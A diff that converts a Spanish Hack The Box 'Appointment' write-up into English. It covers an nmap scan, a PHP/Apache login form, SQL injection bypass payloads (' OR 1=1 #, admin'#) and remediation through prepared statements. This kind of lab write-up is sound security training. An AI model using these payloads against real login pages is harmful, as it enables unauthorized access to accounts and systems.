@@ -1,67 +1,47 @@
----
-categories:
-  - "[[Ciber]]"
-tags:
-  - vms
-  - pentesting
-  - starting-point
-created: 2026-03-13
----
-## 1. Información General
+# Appointment
 
-- **Máquina:** Appointment
+**Platform:** Hack The Box · **Type:** Starting Point · **OS:** Linux · **Difficulty:** Tier 0
 
-- **IP:** 10.129.16.130
+**Summary:** The login form was vulnerable to SQL injection, which allowed a full authentication bypass. The flag was behind the login.
 
-- **SO:** Linux
+## 1. Reconnaissance
 
-- **Dificultad:** Muy fácil
+- **Command:** `nmap -sC -sV 10.129.16.130`
+- **Open ports:**
 
-- **Fecha:** 13/03/2026
+| **Port** | **Service** | **Version**  | **State** |
+| -------- | ----------- | ------------ | --------- |
+| 80       | HTTP        | Apache httpd | Open      |
 
-## 2. Resumen Ejecutivo
+- **Stack:** PHP / Apache
+- **Key finding:** an exposed web app with a login form.
 
-Se identificó una aplicación web vulnerable con inyección SQL que permitía el bypass completo de la autenticación mediante una consulta mágica. La flag se encontraba tras un formulario de login sin validación de inputs.
+## 2. Foothold
 
-## 3. Enumeración (Reconocimiento)
+The login doesn't sanitize input, so a basic SQLi works.
 
-### 3.1 Escaneo de Red
+```
+Username: ' OR 1=1 #
+Password: anything
+Result:   logged in without valid credentials
+```
 
-- **Comando utilizado:** `nmap -sC -sV 10.129.16.130`
+Alternative, targeting the admin account:
+```
+Username: admin'#
+Result:   logged in; the # comments out the rest of the query, including the password check
+```
 
-- **Puertos Abiertos:**
+## 3. Privilege Escalation
 
-| **Puerto** | **Servicio** | **Versión**  | **Estado** |
-| ---------- | ------------ | ------------ | ---------- |
-| 80         | HTTP         | Apache httpd | Abierto    |
+Not applicable: the flag is shown after logging in.
 
-### 3.2 Análisis de Servicios
+## 4. Conclusion
 
-_(Aquí es donde detallas lo que encontraste manualmente)_
+**Severity:** High
 
-- **Tecnologías Detectadas:** PHP/Apache
+**Chain:** unsanitized login input → SQL injection → authentication bypass.
 
-- **Hallazgos Clave:** Web app expuesta con formulario de login visible
-
-## 4. Explotación (Gaining Access)
-
-- **Razonamiento:** La web no sanitiza inputs en el login, permitiendo exploits SQLi básicos
-
-- **Pasos de Reproducción:**
-    Login a la aplicación web:
-    Usuario: ' OR 1=1 #
-    Contraseña: cualquier valor
-    Resultado: Login exitoso sin autenticación
-
-    Consulta alternativa para admin:
-    Usuario: admin'#
-    Resultado: Login exitoso, el hash comenta lo restante de la query
-
-## 5. Remediación y Conclusiones
-
-- **Criticidad:** Alta
-
-- **Recomendaciones:**
-
-	1. **Parcheo:** Validar inputs mediante Prepared Statements en lugar de concatenar strings directamente en queries SQL.
-	2. **Seguridad por defecto:** Deshabilitar login anónimo donde sea posible y aplicar el principio de menos privilegios.
+**Remediation:**
+1. Use prepared statements instead of concatenating strings into SQL queries.
+2. Secure defaults: disable anonymous logins where possible and apply least privilege.
